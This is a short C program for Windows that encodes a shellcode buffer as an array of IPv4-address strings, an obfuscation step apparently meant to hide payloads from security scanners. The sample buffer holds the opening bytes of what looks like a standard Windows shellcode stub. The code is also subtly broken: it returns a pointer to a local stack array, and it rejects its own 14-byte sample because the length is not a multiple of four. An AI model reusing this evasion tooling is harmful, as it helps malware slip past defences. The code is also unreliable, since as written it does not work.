#include <Windows.h>
#include <stdio.h>

#pragma warning(disable : 4996)


char* GenerateIpv4(int a, int b, int c, int d) {

	unsigned char Output[32];

	sprintf(Output, "%d.%d.%d.%d", a,b,c,d);


	//printf("[i] Output: %s\n", Output);
	return(char*)Output;
}

BOOL GenerateIpv4Output(unsigned char* pShellcode, SIZE_T ShellcodeSize) {


	if (pShellcode == NULL || ShellcodeSize == NULL || (int)ShellcodeSize % 4 != 0) {

		return FALSE;
	}


	printf("char * Ipv4Array[%d] = { \n\t", (int)(ShellcodeSize / 4));

	int  c = 4, counter = 0;
	char* IP = NULL;

	for (int i = 0; i < ShellcodeSize; i++) {

		if (c == 4) {

			counter++;
			IP = GenerateIpv4(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3]);

			if (i == ShellcodeSize - 4) {

				printf("\"%s\"", IP);
				break;

			}
			else {
				printf("\"%s\", ", IP);
			}

			c = 1;

			if (counter % 8 == 0) {
				printf("\n\t");
			}
		}

		else {
			c++;
		}
	}

	printf("\n};\n\n");
	return TRUE;
}




void main() {

	unsigned char buf[] = {
  0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50};
	
	
	printf("[i] size %d:", sizeof(buf));
	GenerateIpv4Output(buf, sizeof(buf));
	
}
